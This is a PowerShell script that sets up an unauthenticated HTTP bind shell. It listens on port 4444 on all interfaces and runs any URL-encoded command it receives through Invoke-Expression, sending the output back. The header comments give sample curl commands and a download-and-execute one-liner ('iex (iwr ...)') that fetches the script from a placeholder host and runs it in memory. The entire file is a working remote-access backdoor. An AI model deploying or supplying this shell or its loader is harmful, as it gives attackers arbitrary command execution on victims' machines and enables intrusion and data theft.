
# Listens for HTTP requests and executes the provided commands
# Commands must be URI Encoded (e.g. ' ' => %20)
# For example:
# curl "http://localhost:8000/(iwr%20google.com).StatusCode"
# curl "http://localhost:8000/get-process"
# curl "http://localhost:8000/2%2B2"

# iex (iwr "https://hostname/path/Start-HTTPShell.ps1").content

Function Start-HTTPShell(){
  $keep_going = $true
  $MAX_ATTEMPTS = 10
  $listen_port = 4444
  $attempt_ctr = 0

  # Initialize HTTP Service
  while($attempt_ctr -le $MAX_ATTEMPTS -and $attempt_ctr -ne -1){
    try{
      $http_listener = New-Object System.Net.HttpListener
      $http_listener.Prefixes.Add("http://+:$listen_port/")
      $http_listener.Start()
      $attempt_ctr = -1
      Write-Host -ForegroundColor Green " [*] Success. Began listening on port $listen_port"
    }catch{
      $attempt_ctr++
      Write-Host -ForegroundColor Red " [-] Error starting shell`n [-]    $_`n [-]    Attempt $attempt_ctr/$MAX_ATTEMPTS"
      if($attempt_ctr -ge $MAX_ATTEMPTS){
        Write-Host -ForegroundColor Red  " [-] Too many attempts, quitting"
        return
      }else{
        Start-Sleep -Seconds 10
      }
    }
  }

  # Main Loop
  While ($http_listener.IsListening -and $keep_going) {
      $http_context = $http_listener.GetContext()
      $http_request = $http_context.Request
      $command = $http_request.RawUrl
      $command = $command.TrimStart("/") #Remove leading /
      $command = [System.Web.HttpUtility]::UrlDecode($command)
      Write-Host " [*] Received Command $command"
      if($command -eq "quit"){
        $keep_going = $false
        $response = "Goodbye!`n"
        Write-Host " [*] Received quit signal, shutting down"
      }
      elseif($command -ne ""){
        $response = Invoke-Expression $command
        $response = $response | Out-String
      }
      $http_response = $http_context.Response
      $http_response.Headers.Add("Content-Type","text/plain")
      $http_response.StatusCode = 200
      $response = [System.Text.Encoding]::UTF8.GetBytes($response)
      $http_response.ContentLength64 = $response.Length
      $http_response.OutputStream.Write($response,0,$response.Length)
      $http_response.Close()
      Start-Sleep -Milliseconds 250
  }
  $http_listener.Stop()
  Write-Host " [*] Done"
}

Start-HTTPShell
